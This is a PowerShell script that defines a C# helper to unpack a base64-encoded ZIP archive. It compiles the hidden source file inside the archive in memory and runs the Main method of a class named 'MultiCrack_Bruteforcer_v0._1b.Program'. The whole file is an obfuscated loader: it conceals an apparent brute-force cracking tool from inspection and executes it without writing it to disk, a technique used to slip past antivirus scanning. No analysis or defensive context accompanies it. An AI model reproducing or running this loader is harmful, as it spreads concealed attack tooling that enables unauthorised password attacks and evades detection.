$code = @"
using System;
using System.IO;
using System.IO.Compression;
//using System.IO.Compression.FileSystem;
using System.Text;
namespace ZipMe {
	public class Now {
		public string Unzip(string base6, string filename)
        {
	        byte[] zippedBuffer = Convert.FromBase64String(base6);
            using (var zippedStream = new MemoryStream(zippedBuffer))
            {
                using (var archive = new ZipArchive(zippedStream))
                {
                //var entry = archive.Entries;
		            foreach(var ent in archive.Entries) {
			            if(ent != null) {
				            if(ent.Name == filename) {
					            using (var unzippedEntryStream = ent.Open())
                                {
                                    using (var ms = new MemoryStream())
                                    {
                                        unzippedEntryStream.CopyTo(ms);
                                        var unzippedArray = ms.ToArray();
 
                                        return Encoding.Default.GetString(unzippedArray);
                                    }
                                }
				            }
			            }
		            }
 
                 return null;
                }
            }
        }
	}
}
"@
Add-Type -TypeDefinition $code -ReferencedAssemblies @("System.IO.Compression", "System.IO.Compression.FileSystem")
$instance = New-Object ZipMe.Now;
Add-Type -TypeDefinition $instance.Unzip("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", "p.t") -ReferencedAssemblies @("Microsoft.CSharp","System", "System.Core", "System.Data", "System.Data.DataSetExtensions", "System.Deployment", "System.Drawing", "System.Net.Http", "System.Windows.Forms", "System.Xml", "System.Xml.Linq") -IgnoreWarnings
$newinstance = New-Object MultiCrack_Bruteforcer_v0._1b.Program;
#Start-Job -ScriptBlock {$newinstance.Main();}
$newinstance.Main();